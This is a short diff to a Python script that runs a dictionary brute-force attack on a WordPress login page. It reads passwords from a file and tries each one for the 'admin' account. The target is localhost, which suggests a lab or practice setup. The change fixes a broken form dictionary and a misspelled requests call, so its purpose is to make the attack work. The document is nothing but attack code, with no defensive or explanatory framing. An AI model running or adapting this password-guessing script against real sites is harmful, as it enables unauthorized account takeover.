@@ -5,8 +5,8 @@ address = 'http://localhost/wp-login.php'
 passwordfile = open("password.txt","r")
 
 for line in passwordfile:
-  data_dict = {"log","admin","pwd":line.strip(),"Login":"submit"}
-  response = requests.posts(address, data=data_dict)
+  formdata = {"log":"admin","pwd":line.strip(),"Login":"submit"}
+  response = requests.post(address, data=formdata)
   if "login_error" in str(response.content):
     pass
   else:
